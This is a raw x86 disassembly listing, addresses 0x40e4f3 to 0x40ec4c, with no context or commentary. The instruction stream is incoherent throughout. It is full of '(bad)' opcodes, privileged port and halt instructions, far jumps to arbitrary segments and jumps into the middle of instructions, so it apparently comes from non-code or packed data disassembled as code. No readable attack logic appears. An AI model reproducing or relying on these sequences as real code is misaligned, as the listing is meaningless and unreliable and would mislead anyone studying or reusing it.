  40e4f3:	adc    DWORD PTR [edx+0x3e],eax
  40e4f6:	push   ecx
  40e4f7:	enter  0x888,0xe1
  40e4fb:	jne    0x40e4d6
  40e4fd:	or     eax,0xd607faa2
  40e502:	cmp    DWORD PTR [esi+0x0],0x3d15e452
  40e509:	sub    al,0x2
  40e50c:	(bad)  
  40e50d:	rcr    al,1
  40e50f:	jmp    0xbe95:0x2a71cfe
  40e516:	sbb    BYTE PTR [ecx-0x42c6c931],dh
  40e51c:	jmp    0x3675a778
  40e521:	fidivr DWORD PTR [ebx]
  40e523:	psubusb mm0,mm4
  40e526:	dec    edi
  40e527:	scas   al,BYTE PTR es:[edi]
  40e528:	jle    0x40e5a6
  40e52a:	sar    ecx,cl
  40e52c:	fcomp  QWORD PTR [ebx-0x75]
  40e52f:	fwait
  40e530:	add    DWORD PTR ds:0x11db1ba7,ebx
  40e536:	ror    esp,0x13
  40e539:	sbb    dh,BYTE PTR [eax+0x76affb60]
  40e53f:	test   eax,0xc139bc39
  40e544:	dec    esp
  40e545:	sub    al,0x74
  40e547:	or     DWORD PTR [ecx+0x52],0x49
  40e54b:	lock inc esi
  40e54d:	fstp   TBYTE PTR [ebp*2+0x7b45e5e]
  40e554:	inc    edx
  40e555:	fcom   DWORD PTR [esi+eiz*1-0x29331c73]
  40e55c:	xchg   ecx,eax
  40e55d:	fs mov ebp,0xf690d087
  40e563:	fwait
  40e564:	cli    
  40e565:	lock inc BYTE PTR ds:0x52ab4c11
  40e56c:	jmp    0xc790:0xbfd59d18
  40e573:	and    DWORD PTR [eax],esp
  40e575:	inc    ebx
  40e576:	lahf   
  40e577:	jbe    0x40e510
  40e579:	hlt    
  40e57a:	xchg   DWORD PTR [ebx],eax
  40e57c:	outs   dx,BYTE PTR ds:[esi]
  40e57d:	js     0x40e5c9
  40e57f:	jle    0x40e554
  40e581:	push   ds
  40e582:	and    DWORD PTR [edx+0x27f3836f],0xffffffa3
  40e589:	call   0x5bc0ce30
  40e58e:	or     DWORD PTR [esi+0x7f9db10d],ebp
  40e594:	push   edx
  40e595:	adc    DWORD PTR [ebx+0x6f],ebp
  40e598:	fisub  WORD PTR [edi]
  40e59a:	ja     0x40e51f
  40e59c:	(bad)  
  40e59e:	push   DWORD PTR [ecx]
  40e5a0:	adc    bl,BYTE PTR [esi]
  40e5a2:	sbb    BYTE PTR [ecx-0x7b],dl
  40e5a5:	in     eax,dx
  40e5a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e5a7:	aaa    
  40e5a8:	pop    ebx
  40e5a9:	cs call 0x61ff5157
  40e5af:	scas   eax,DWORD PTR es:[edi]
  40e5b0:	add    DWORD PTR [ebp+edx*8-0x194d6431],esi
  40e5b7:	test   eax,0x1b7fd62b
  40e5bc:	sar    BYTE PTR [edx-0x58],1
  40e5bf:	sbb    BYTE PTR [ebx+0x524be480],ah
  40e5c5:	icebp  
  40e5c6:	and    dl,dl
  40e5c8:	mov    DWORD PTR [esi-0x14],esp
  40e5cb:	sub    eax,0x68d7e499
  40e5d0:	into   
  40e5d1:	xchg   DWORD PTR [edi],ebp
  40e5d3:	ins    BYTE PTR es:[edi],dx
  40e5d4:	pop    ebp
  40e5d5:	xchg   DWORD PTR [esp+edi*4],edi
  40e5d8:	push   es
  40e5d9:	retf   
  40e5da:	nop
  40e5db:	cmp    dh,BYTE PTR [ecx]
  40e5dd:	sar    BYTE PTR [ecx-0x9],cl
  40e5e0:	std    
  40e5e1:	sub    ebp,DWORD PTR [edi+0x279cf2cd]
  40e5e7:	in     eax,0x64
  40e5e9:	pop    ecx
  40e5ea:	dec    eax
  40e5eb:	es sub eax,0x195b4687
  40e5f1:	add    BYTE PTR [eax+0xb88638d],0xc1
  40e5f8:	sbb    dl,BYTE PTR [esi-0x5c]
  40e5fb:	or     al,0xec
  40e5fd:	jecxz  0x40e63d
  40e5ff:	fwait
  40e600:	mov    esi,0xea57887a
  40e605:	mov    ah,0xd5
  40e607:	dec    edx
  40e608:	iret   
  40e609:	aad    0x24
  40e60b:	sbb    ebp,DWORD PTR [esi+0x32039d73]
  40e611:	add    al,BYTE PTR [ecx]
  40e613:	jle    0x40e608
  40e615:	pop    eax
  40e616:	dec    esi
  40e617:	add    al,BYTE PTR [esi-0x44]
  40e61a:	cmp    al,0x33
  40e61c:	in     eax,dx
  40e61d:	(bad)  
  40e61f:	out    0xa2,eax
  40e621:	pop    eax
  40e622:	mov    ch,BYTE PTR [edi-0x1e15f64f]
  40e628:	lock mov eax,ds:0x451ecc23
  40e62e:	or     al,0x9
  40e630:	or     al,0xfc
  40e632:	loop   0x40e682
  40e634:	jle    0x40e610
  40e636:	pushf  
  40e637:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e638:	(bad)  
  40e639:	dec    ecx
  40e63a:	cmp    BYTE PTR [ecx],ah
  40e63c:	jae    0x40e63f
  40e63e:	ror    DWORD PTR [ebx-0x22],cl
  40e641:	pop    ds
  40e642:	ja     0x40e64a
  40e644:	mov    ecx,0x78fdea28
  40e649:	cmp    esi,DWORD PTR [esi]
  40e64b:	or     ecx,esi
  40e64d:	popa   
  40e64e:	mov    ah,0x2a
  40e650:	inc    edi
  40e651:	jge    0x40e6b0
  40e653:	sub    DWORD PTR [ebp+0x7a],esp
  40e656:	push   ds
  40e657:	enter  0xe468,0x2f
  40e65b:	js     0x40e6bc
  40e65d:	jle    0x40e61d
  40e65f:	push   edx
  40e660:	or     al,0x94
  40e662:	mov    al,0x7d
  40e664:	shr    DWORD PTR [edx+0x3d6477c4],cl
  40e66a:	dec    esp
  40e66b:	das    
  40e66c:	hlt    
  40e66d:	repz jnp 0x40e663
  40e670:	(bad)  
  40e671:	cld    
  40e672:	mov    ah,0xab
  40e674:	call   0x4b52:0x839c1a6c
  40e67b:	inc    esp
  40e67c:	xchg   esp,eax
  40e67d:	(bad)  
  40e67e:	(bad)  
  40e680:	sbb    BYTE PTR [ebx-0x3b1403af],bl
  40e686:	(bad)  [edi+0x6673670b]
  40e68c:	int3   
  40e68d:	frstor [eax-0x118b42db]
  40e693:	dec    ecx
  40e694:	mov    DWORD PTR [ecx-0x4c],ebp
  40e697:	push   edi
  40e698:	lods   al,BYTE PTR ds:[esi]
  40e699:	mov    dl,0xf7
  40e69b:	cmp    DWORD PTR ds:0x4e6194fc,edx
  40e6a1:	ror    esi,cl
  40e6a3:	aam    0x21
  40e6a5:	inc    eax
  40e6a6:	outs   dx,DWORD PTR ds:[esi]
  40e6a7:	or     BYTE PTR [eax+esi*8-0x12ad10fd],cl
  40e6ae:	jecxz  0x40e6ac
  40e6b0:	ins    DWORD PTR es:[edi],dx
  40e6b1:	adc    al,0xc9
  40e6b3:	(bad)  [esi+0xe9b0ffb]
  40e6b9:	ins    DWORD PTR es:[edi],dx
  40e6ba:	aam    0xe
  40e6bc:	and    edx,DWORD PTR [edx]
  40e6be:	jge    0x40e702
  40e6c0:	jl     0x40e648
  40e6c2:	out    0x61,eax
  40e6c4:	ror    BYTE PTR [edx-0x70],0x49
  40e6c8:	adc    al,0xe1
  40e6ca:	repnz ficomp WORD PTR [edi-0x6bf85491]
  40e6d1:	in     al,0x80
  40e6d3:	ss in  eax,0xa3
  40e6d6:	scas   al,BYTE PTR es:[edi]
  40e6d7:	mov    cl,0xfb
  40e6d9:	ss inc esi
  40e6db:	add    eax,0xf95d6257
  40e6e0:	in     al,0x43
  40e6e2:	dec    edx
  40e6e3:	sub    dl,al
  40e6e5:	xchg   ecx,eax
  40e6e6:	mov    dh,0xcf
  40e6e8:	cwde   
  40e6e9:	dec    eax
  40e6ea:	rsqrtps xmm7,XMMWORD PTR [edi-0x1]
  40e6ee:	loope  0x40e67d
  40e6f0:	gs pop ecx
  40e6f2:	das    
  40e6f3:	and    eax,0xa85d17f
  40e6f8:	fiadd  WORD PTR es:[esi-0x29]
  40e6fc:	cs cli 
  40e6fe:	sbb    al,BYTE PTR [edi+0x3d]
  40e701:	out    dx,eax
  40e702:	mov    es,ebp
  40e704:	inc    ebx
  40e705:	sub    edi,DWORD PTR [edi]
  40e707:	mov    eax,0x97e56718
  40e70c:	out    0x74,al
  40e70e:	shl    BYTE PTR [edi-0x75],0xfa
  40e712:	adc    eax,0x8623ec61
  40e717:	or     BYTE PTR [edx+0x1],bl
  40e71a:	(bad)  
  40e71b:	sub    BYTE PTR [eax-0x35],ch
  40e71e:	in     al,dx
  40e71f:	ja     0x40e6f2
  40e721:	jno    0x40e725
  40e723:	xchg   BYTE PTR [edx-0x11e60ef0],bl
  40e729:	in     eax,dx
  40e72a:	xchg   DWORD PTR [edi],ebp
  40e72c:	retf   0xc9cd
  40e72f:	add    eax,0x483e6b8f
  40e734:	clc    
  40e735:	ficomp DWORD PTR [edi+0x68]
  40e738:	call   0xa051:0x479a33f5
  40e73f:	cwde   
  40e740:	or     DWORD PTR [ecx],esi
  40e742:	ins    BYTE PTR es:[edi],dx
  40e743:	xchg   esp,eax
  40e744:	(bad)  
  40e745:	sbb    DWORD PTR [ecx],ebp
  40e747:	ins    DWORD PTR es:[edi],dx
  40e748:	dec    ebp
  40e749:	mov    edx,DWORD PTR [edx]
  40e74b:	shl    DWORD PTR [ebx-0x56c374d],0xba
  40e752:	sub    DWORD PTR [edx-0x44],ecx
  40e755:	push   es
  40e756:	push   eax
  40e757:	int3   
  40e758:	mov    ch,0x5c
  40e75a:	hlt    
  40e75b:	push   esi
  40e75c:	mov    dh,BYTE PTR [edi-0x51d49a22]
  40e762:	xor    al,0x7f
  40e764:	(bad)  
  40e765:	jns    0x40e7c7
  40e767:	xchg   esi,eax
  40e768:	add    al,0x5b
  40e76a:	lods   eax,DWORD PTR ds:[esi]
  40e76b:	das    
  40e76c:	(bad)  
  40e76d:	or     al,0xd2
  40e76f:	lock rcr DWORD PTR [edi],0x12
  40e773:	mov    esi,0xa3759c59
  40e778:	jb     0x40e7b2
  40e77a:	data16 ror BYTE PTR [ebx+0x2],1
  40e77e:	xchg   esp,eax
  40e77f:	fcomp  QWORD PTR [eax+0x73367de]
  40e785:	push   ebp
  40e786:	mov    bl,0xcf
  40e788:	sbb    eax,0xcf1c88c2
  40e78d:	sti    
  40e78e:	test   BYTE PTR [ebx],ch
  40e790:	iret   
  40e791:	cdq    
  40e792:	std    
  40e793:	mov    eax,0xfb303e3f
  40e798:	das    
  40e799:	dec    esi
  40e79a:	pop    eax
  40e79b:	cmp    BYTE PTR [ebx-0x7a81c5d3],bl
  40e7a1:	rcl    BYTE PTR [edi-0xe],1
  40e7a4:	inc    ebp
  40e7a5:	dec    edx
  40e7a6:	mov    ch,0xc6
  40e7a8:	inc    ebp
  40e7a9:	add    DWORD PTR [ebp-0x64],0xfffffffa
  40e7ad:	mov    bh,0x56
  40e7af:	jno    0x40e7e7
  40e7b1:	fwait
  40e7b2:	pusha  
  40e7b3:	pop    ds
  40e7b4:	push   0x16
  40e7b6:	dec    esp
  40e7b7:	mov    bh,0x8e
  40e7b9:	lods   eax,DWORD PTR ds:[esi]
  40e7ba:	icebp  
  40e7bb:	or     BYTE PTR [edi-0x58],0xf6
  40e7bf:	add    DWORD PTR [edi+edi*8-0x30],edx
  40e7c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e7c4:	lahf   
  40e7c5:	cli    
  40e7c6:	int3   
  40e7c7:	dec    esi
  40e7c8:	bound  edi,QWORD PTR [esi-0xa720e77]
  40e7ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e7cf:	scas   eax,DWORD PTR es:[edi]
  40e7d0:	mov    ebp,0x24c20c12
  40e7d5:	jmp    0xbe175f9d
  40e7da:	and    edx,edx
  40e7dc:	test   BYTE PTR [edx+0x357a684c],bl
  40e7e2:	cli    
  40e7e3:	mov    al,0xc4
  40e7e5:	mov    ds:0x3afd528,eax
  40e7ea:	(bad)  
  40e7eb:	fsubr  DWORD PTR [ecx-0x5c67a97e]
  40e7f1:	aaa    
  40e7f2:	jge    0x40e812
  40e7f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7f5:	xchg   ebp,eax
  40e7f6:	mov    edx,0xb399057d
  40e7fb:	les    ebp,FWORD PTR [edi]
  40e7fd:	in     eax,0x92
  40e7ff:	jl     0x40e784
  40e801:	cmp    dl,BYTE PTR [eax-0x5]
  40e804:	cmp    eax,0x5c750511
  40e809:	leave  
  40e80a:	xchg   edi,eax
  40e80b:	loopne 0x40e873
  40e80d:	inc    ebx
  40e80e:	and    al,0x2c
  40e810:	ror    dl,cl
  40e812:	fiadd  WORD PTR [esi+0x41]
  40e815:	jmp    0x40e83e
  40e817:	mov    esp,0xf0ef93e0
  40e81c:	sbb    eax,0x46a2895d
  40e821:	adc    dl,BYTE PTR [ecx]
  40e823:	cmp    BYTE PTR [ebp+0x59],0x2f
  40e827:	fmul   QWORD PTR [ebp-0x52]
  40e82a:	iret   
  40e82b:	mov    ah,0x54
  40e82d:	neg    BYTE PTR [esi-0x2e03a82c]
  40e833:	sar    ch,0x43
  40e836:	lea    esp,[esi+esi*8-0x3b]
  40e83a:	sbb    eax,0x71fca7e2
  40e83f:	(bad)  
  40e840:	in     al,dx
  40e841:	ds icebp 
  40e843:	jmp    0x40e7d3
  40e845:	mov    ecx,0xa03cdacc
  40e84a:	rcl    edi,cl
  40e84c:	stc    
  40e84d:	or     al,0xd
  40e84f:	ret    
  40e850:	lds    esi,FWORD PTR ds:0x8726a8f8
  40e857:	repz cmp ecx,DWORD PTR [ebp-0x37d6d868]
  40e85e:	mov    dh,0x1d
  40e860:	mov    al,ds:0xc8d3e3d6
  40e865:	scas   al,BYTE PTR es:[edi]
  40e866:	pop    ecx
  40e867:	lds    eax,FWORD PTR [ebx-0x67114816]
  40e86d:	xor    ch,bl
  40e86f:	adc    cl,0xb5
  40e872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e873:	or     BYTE PTR [edi+0x52],al
  40e876:	jns    0x40e83e
  40e878:	cli    
  40e879:	stc    
  40e87a:	test   BYTE PTR [ebp+0x7f],bh
  40e87d:	add    esi,ecx
  40e87f:	xchg   ecx,eax
  40e880:	inc    eax
  40e881:	sbb    eax,0x2259120c
  40e886:	dec    eax
  40e887:	inc    edx
  40e888:	daa    
  40e889:	cmp    eax,0xd17bad62
  40e88e:	and    BYTE PTR [ebx*8+0x1998624d],cl
  40e895:	sbb    edx,edx
  40e897:	cmp    DWORD PTR [edi+0x62],esi
  40e89a:	(bad)  
  40e89b:	mov    dh,0xcc
  40e89d:	in     al,dx
  40e89e:	aad    0x2a
  40e8a0:	inc    esi
  40e8a1:	cdq    
  40e8a2:	test   eax,0xef8d6eea
  40e8a7:	jae    0x40e868
  40e8a9:	jmp    0xd21c:0x8df21ec2
  40e8b0:	(bad)  
  40e8b2:	in     al,dx
  40e8b3:	(bad)  
  40e8b4:	lods   eax,DWORD PTR ds:[esi]
  40e8b5:	int3   
  40e8b6:	fmul   QWORD PTR [ebp+ebp*4+0x52]
  40e8ba:	arpl   bx,cx
  40e8bc:	mov    bl,0x2f
  40e8be:	lahf   
  40e8bf:	xchg   edi,eax
  40e8c0:	ret    
  40e8c1:	sbb    DWORD PTR [bx+0x5030],0x29
  40e8c7:	dec    eax
  40e8c8:	jl     0x40e915
  40e8ca:	mov    dl,BYTE PTR [edx]
  40e8cc:	das    
  40e8cd:	jge    0x40e8e1
  40e8cf:	int    0xbf
  40e8d1:	add    eax,0xcacffaaa
  40e8d6:	cld    
  40e8d7:	push   ds
  40e8d8:	mov    dh,0x3b
  40e8da:	push   esi
  40e8db:	pop    ss
  40e8dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8dd:	mov    esp,DWORD PTR [edx-0x7e1e18aa]
  40e8e3:	test   al,0x73
  40e8e5:	sbb    al,0x82
  40e8e7:	sti    
  40e8e8:	stos   DWORD PTR es:[edi],eax
  40e8e9:	xchg   edx,eax
  40e8ea:	xor    al,dl
  40e8ec:	add    al,0xae
  40e8ee:	daa    
  40e8ef:	mov    ch,0xd1
  40e8f1:	xchg   esp,eax
  40e8f2:	and    DWORD PTR [ebp+0x1d],edi
  40e8f5:	or     bl,BYTE PTR [ecx]
  40e8f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e8f8:	jne    0x40e8db
  40e8fa:	push   esi
  40e8fb:	pop    edi
  40e8fc:	loopne 0x40e8a3
  40e8fe:	dec    ecx
  40e8ff:	mov    bh,0x23
  40e901:	cdq    
  40e902:	test   BYTE PTR [edi+0x6d1e3f24],dh
  40e908:	dec    eax
  40e909:	xchg   ebx,eax
  40e90a:	popf   
  40e90b:	or     DWORD PTR [eax],0xfc052cb4
  40e911:	mov    ecx,0xa1c14d2a
  40e916:	jmp    0x40e962
  40e918:	imul   BYTE PTR [edx+edi*4]
  40e91b:	mov    edi,0xc40f30f0
  40e920:	(bad)  
  40e921:	repz mov al,ds:0x7f0d6763
  40e927:	dec    edi
  40e928:	data16 je 0x40e926
  40e92b:	jb     0x40e921
  40e92d:	cmp    eax,0x889f6193
  40e932:	stos   DWORD PTR es:[edi],eax
  40e933:	mov    edx,DWORD PTR [edx]
  40e935:	and    DWORD PTR [esi+0x4f],eax
  40e938:	adc    bh,bl
  40e93a:	xchg   ebx,eax
  40e93b:	in     eax,dx
  40e93c:	(bad)  [eax+0x6ccf5756]
  40e942:	cmp    edi,0x56
  40e945:	hlt    
  40e946:	les    edx,FWORD PTR [ecx+0x4e]
  40e949:	fiadd  WORD PTR [ebp+0x2fe4c00b]
  40e94f:	lea    edx,[ecx-0x21eebe4d]
  40e955:	mov    edi,0x3fe41055
  40e95a:	xor    BYTE PTR [edx-0xc4b0349],cl
  40e960:	hlt    
  40e961:	icebp  
  40e962:	enter  0x30c3,0xe5
  40e966:	fldcw  WORD PTR [ebx-0x515b55d1]
  40e96c:	mov    ch,0x72
  40e96e:	xor    BYTE PTR [esp+eax*1+0x2],ah
  40e972:	(bad)  
  40e973:	mov    dl,0x99
  40e975:	add    ecx,DWORD PTR ds:0xc4472282
  40e97b:	pop    ebx
  40e97c:	inc    esp
  40e97d:	clc    
  40e97e:	and    BYTE PTR [esi+0x71],0x53
  40e982:	ja     0x40e9d8
  40e984:	mov    bh,0xd9
  40e986:	mov    esp,0x7ce315df
  40e98b:	adc    esp,ecx
  40e98d:	iret   
  40e98e:	test   eax,0x55559427
  40e993:	loope  0x40e9ac
  40e995:	or     DWORD PTR [edi-0x27],eax
  40e998:	xor    eax,0xacfa041b
  40e99d:	idiv   BYTE PTR [eax-0x496fdb71]
  40e9a3:	dec    ecx
  40e9a4:	scas   al,BYTE PTR es:[edi]
  40e9a5:	inc    edi
  40e9a6:	fldcw  WORD PTR [edx+0x66]
  40e9a9:	sbb    eax,0x71c01dc4
  40e9ae:	and    BYTE PTR [edx],0x65
  40e9b1:	inc    esi
  40e9b2:	dec    esi
  40e9b3:	and    al,0x40
  40e9b5:	test   DWORD PTR [esi-0xa105f9a],edx
  40e9bb:	cwde   
  40e9bc:	dec    ebp
  40e9bd:	pop    es
  40e9be:	cmp    ebx,DWORD PTR [esi+0x2b]
  40e9c1:	lahf   
  40e9c2:	fbld   TBYTE PTR [edi]
  40e9c4:	pop    esp
  40e9c5:	dec    eax
  40e9c6:	fdiv   DWORD PTR [edx+0x3a465395]
  40e9cc:	jne    0x40ea16
  40e9ce:	outs   dx,BYTE PTR ds:[esi]
  40e9cf:	cmc    
  40e9d0:	dec    ecx
  40e9d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9d2:	lods   al,BYTE PTR ds:[esi]
  40e9d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9d4:	add    BYTE PTR [ebp+0x4b9118dd],bl
  40e9da:	sbb    ebp,0x4c
  40e9dd:	xlat   BYTE PTR cs:[ebx]
  40e9df:	(bad)  
  40e9e0:	push   esp
  40e9e1:	jge    0x40ea58
  40e9e3:	aam    0x94
  40e9e5:	dec    edi
  40e9e6:	loope  0x40e9bf
  40e9e8:	adc    BYTE PTR [esi+0x26],al
  40e9eb:	mov    eax,ds:0x9c5e12fd
  40e9f0:	jns    0x40ea21
  40e9f2:	mov    bl,0x91
  40e9f4:	sbb    al,0xf5
  40e9f6:	xchg   bl,dl
  40e9f8:	aas    
  40e9f9:	jl     0x40e9a4
  40e9fb:	add    esp,eax
  40e9fd:	dec    edi
  40e9fe:	xchg   edx,eax
  40e9ff:	mov    ds:0x72ded894,al
  40ea04:	inc    eax
  40ea05:	mov    ss,edx
  40ea07:	lods   eax,DWORD PTR ds:[esi]
  40ea08:	adc    al,0x12
  40ea0a:	adc    eax,0x85e9db09
  40ea0f:	xchg   DWORD PTR [ecx],ecx
  40ea11:	aam    0xe7
  40ea13:	cmp    BYTE PTR [edi+0x20dfed7f],al
  40ea19:	ja     0x40ea09
  40ea1b:	out    dx,al
  40ea1c:	gs lock mov esp,0x284ed976
  40ea23:	sub    BYTE PTR ds:0x751f7e24,bl
  40ea29:	jp     0x40ea4e
  40ea2b:	adc    ebx,DWORD PTR [ebx+0x1]
  40ea2e:	in     al,0xd3
  40ea30:	push   cs
  40ea31:	scas   eax,DWORD PTR es:[edi]
  40ea32:	dec    esp
  40ea33:	sti    
  40ea34:	add    eax,0x4971b228
  40ea39:	push   ds
  40ea3a:	ins    DWORD PTR es:[edi],dx
  40ea3b:	fdivr  DWORD PTR [ecx+0x1a]
  40ea3e:	nop
  40ea3f:	sub    DWORD PTR [edi+0x65],eax
  40ea42:	adc    ecx,DWORD PTR ds:0xcca6ca81
  40ea48:	mov    al,ds:0x461f4f9c
  40ea4d:	(bad)
  40ea50:	pop    edi
  40ea51:	ss nop
  40ea53:	bound  esi,QWORD PTR [ecx]
  40ea55:	ret    
  40ea56:	pop    edx
  40ea57:	pop    es
  40ea58:	out    dx,eax
  40ea59:	ret    0xb2d7
  40ea5c:	mov    dh,0xcd
  40ea5e:	pop    esp
  40ea5f:	or     bl,ah
  40ea61:	out    dx,eax
  40ea62:	xchg   esi,ebp
  40ea64:	dec    esp
  40ea65:	pop    esp
  40ea66:	adc    al,0x5d
  40ea68:	call   0x2d29f0f3
  40ea6d:	sti    
  40ea6e:	pop    edx
  40ea6f:	(bad)  
  40ea70:	mov    edi,0x6a60be7a
  40ea75:	in     al,0xfa
  40ea77:	or     al,0xc2
  40ea79:	fld    TBYTE PTR [eax+ebx*2+0x35]
  40ea7d:	push   esi
  40ea7e:	call   0xe9d5:0x2686e632
  40ea85:	mov    cl,0x36
  40ea87:	test   al,0x1a
  40ea89:	mov    esi,0x2edae244
  40ea8e:	ret    0x955a
  40ea91:	(bad)  [eax+0x7fcac397]
  40ea97:	into   
  40ea98:	and    esi,DWORD PTR [ebx+edi*1-0x146cc73c]
  40ea9f:	fcom   QWORD PTR [edx+0x66406f9d]
  40eaa5:	std    
  40eaa6:	adc    al,0xe0
  40eaa8:	mov    esp,0xefc6af2b
  40eaad:	push   ds
  40eaae:	pushf  
  40eaaf:	mov    ecx,0x69399eef
  40eab4:	ret    
  40eab5:	dec    ebx
  40eab6:	add    ebx,ebp
  40eab8:	pop    ecx
  40eab9:	cmp    al,0x11
  40eabb:	ins    DWORD PTR es:[edi],dx
  40eabc:	mov    edx,0x9d3399fa
  40eac1:	push   ebx
  40eac2:	xchg   ebx,eax
  40eac3:	not    BYTE PTR [esi]
  40eac5:	push   ebx
  40eac6:	jns    0x40ea70
  40eac8:	loopne 0x40eb44
  40eaca:	fisubr DWORD PTR ss:[ebx]
  40eacd:	aam    0x53
  40eacf:	pop    eax
  40ead0:	out    dx,eax
  40ead1:	(bad)  
  40ead2:	adc    esp,DWORD PTR [edi+0xada0d10]
  40ead8:	cmp    al,0x61
  40eada:	fiadd  WORD PTR [edi]
  40eadc:	mov    ds:0x30d8cacf,al
  40eae1:	fwait
  40eae2:	enter  0xa6e5,0x54
  40eae6:	and    ebp,0x22
  40eae9:	sti    
  40eaea:	pop    ebx
  40eaeb:	cmp    al,0xc
  40eaed:	fild   DWORD PTR [edi]
  40eaef:	pop    ebp
  40eaf0:	sbb    dh,BYTE PTR [edx]
  40eaf2:	jo     0x40ea95
  40eaf4:	(bad)  
  40eaf5:	jnp    0x40eb3e
  40eaf7:	ret    0x6b59
  40eafa:	and    al,0xd9
  40eafc:	sub    dh,dh
  40eafe:	popa   
  40eaff:	pop    edx
  40eb00:	and    ebp,DWORD PTR [ebx]
  40eb02:	fstp   DWORD PTR [ecx+0x693e22a5]
  40eb08:	test   al,0x73
  40eb0a:	lock push 0x7bd516f1
  40eb10:	push   0xffffffaf
  40eb12:	nop
  40eb13:	dec    edx
  40eb14:	dec    edx
  40eb15:	ins    BYTE PTR es:[edi],dx
  40eb16:	sub    BYTE PTR [edx-0x66],0x9b
  40eb1a:	out    dx,eax
  40eb1b:	ss push 0xb877c545
  40eb21:	jnp    0x40eb5e
  40eb23:	sbb    bh,BYTE PTR [eax-0x60d43410]
  40eb29:	jmp    0xf461:0x9c9c867
  40eb30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb31:	xor    DWORD PTR [ecx-0x11],edx
  40eb34:	xor    eax,0x8067cd7a
  40eb39:	mov    ss,WORD PTR [ecx-0x65]
  40eb3c:	test   DWORD PTR [ebx+0x27],ecx
  40eb3f:	jmp    0xc1c91c78
  40eb44:	ja     0x40eb83
  40eb46:	push   edx
  40eb47:	fcomp  QWORD PTR [edx+0x5f470d42]
  40eb4d:	cmc    
  40eb4e:	push   0x51
  40eb50:	dec    eax
  40eb51:	nop
  40eb52:	add    edx,DWORD PTR [edx]
  40eb54:	jae    0x40ebcb
  40eb56:	retf   
  40eb57:	jecxz  0x40eb32
  40eb59:	adc    dl,al
  40eb5b:	mov    bh,0x7d
  40eb5d:	xor    BYTE PTR [edx-0x4b],bh
  40eb60:	mov    cl,0xd2
  40eb62:	neg    DWORD PTR [ebx+0x708e2eac]
  40eb68:	retf   
  40eb69:	loopne 0x40eb95
  40eb6b:	std    
  40eb6c:	and    BYTE PTR [eax-0x50678783],ch
  40eb72:	inc    ecx
  40eb73:	adc    BYTE PTR ds:0xb081ce52,bh
  40eb79:	dec    ebp
  40eb7a:	xchg   ebx,eax
  40eb7b:	iret   
  40eb7c:	enter  0x3bba,0x61
  40eb80:	and    al,0x4
  40eb82:	sbb    BYTE PTR [ebx-0x2dbc47e],dl
  40eb88:	dec    edx
  40eb89:	test   DWORD PTR [ebx-0x76],esi
  40eb8c:	inc    DWORD PTR [edi]
  40eb8e:	sbb    bh,0x49
  40eb91:	fbstp  TBYTE PTR [edi]
  40eb93:	ds pop eax
  40eb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb96:	in     eax,0x92
  40eb98:	nop
  40eb99:	mov    ebp,0x971f99c4
  40eb9e:	cmp    eax,0x510fa225
  40eba3:	inc    ecx
  40eba4:	jae    0x40eb53
  40eba6:	cli    
  40eba7:	sub    al,0x28
  40eba9:	std    
  40ebaa:	pop    ds
  40ebab:	(bad)  
  40ebac:	cwde   
  40ebad:	shl    DWORD PTR [ebx+0x14af03e6],1
  40ebb3:	or     dh,BYTE PTR [esi]
  40ebb5:	lds    ebp,FWORD PTR [edi-0x20129f4c]
  40ebbb:	inc    ebx
  40ebbc:	mov    cl,0xb3
  40ebbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ebbf:	add    dh,ch
  40ebc1:	arpl   WORD PTR [esp+edx*8+0x43245f7e],sp
  40ebc8:	push   ss
  40ebc9:	jae    0x40ec0d
  40ebcb:	pop    eax
  40ebcc:	and    eax,0xf830ca5c
  40ebd1:	sub    BYTE PTR [esi],dh
  40ebd3:	fmul   DWORD PTR ds:0xc22116fb
  40ebd9:	mov    ds:0x3b2aef5b,eax
  40ebde:	xchg   edx,eax
  40ebdf:	loop   0x40ebc4
  40ebe1:	jae    0x40eb76
  40ebe3:	inc    esp
  40ebe4:	(bad)  
  40ebe5:	pop    esp
  40ebe6:	jo     0x40eb72
  40ebe8:	(bad)
  40ebeb:	cmc    
  40ebec:	int3   
  40ebed:	or     ah,bl
  40ebef:	lock adc DWORD PTR [ebp-0x27],esp
  40ebf3:	leave  
  40ebf4:	std    
  40ebf5:	lds    esp,FWORD PTR [esi]
  40ebf7:	dec    eax
  40ebf8:	dec    eax
  40ebf9:	dec    ecx
  40ebfa:	ja     0x40ec4a
  40ebfc:	icebp  
  40ebfd:	aad    0x28
  40ebff:	sbb    al,0xf1
  40ec01:	dec    esi
  40ec02:	fmul   DWORD PTR [edi+0x5b]
  40ec05:	cwde   
  40ec06:	adc    ch,BYTE PTR [edi+0xd]
  40ec09:	dec    esi
  40ec0a:	jmp    0x389abd19
  40ec0f:	out    dx,eax
  40ec10:	push   edx
  40ec11:	in     eax,0x96
  40ec13:	mov    BYTE PTR [esi+0x66],bl
  40ec16:	sbb    ch,BYTE PTR [edi-0x6e6a4599]
  40ec1c:	sub    al,0x2c
  40ec1e:	in     al,dx
  40ec1f:	adc    al,0x88
  40ec21:	pop    ds
  40ec22:	inc    ebx
  40ec23:	loope  0x40ebb1
  40ec25:	mov    DWORD PTR [ebx+0x1],eax
  40ec28:	nop
  40ec29:	mov    ds:0x52265833,al
  40ec2e:	adc    eax,0x68ccec12
  40ec33:	xchg   BYTE PTR [esi],al
  40ec35:	test   DWORD PTR [edi+0x42],esp
  40ec38:	sub    al,0xc2
  40ec3a:	push   eax
  40ec3b:	test   BYTE PTR [ebx],dl
  40ec3d:	mov    eax,0x2cd2bee6
  40ec42:	or     dh,BYTE PTR [ecx-0x39d714cf]
  40ec48:	jecxz  0x40ec66
  40ec4a:	cdq    
  40ec4b:	xchg   ecx,eax
  40ec4c:	dec    esi
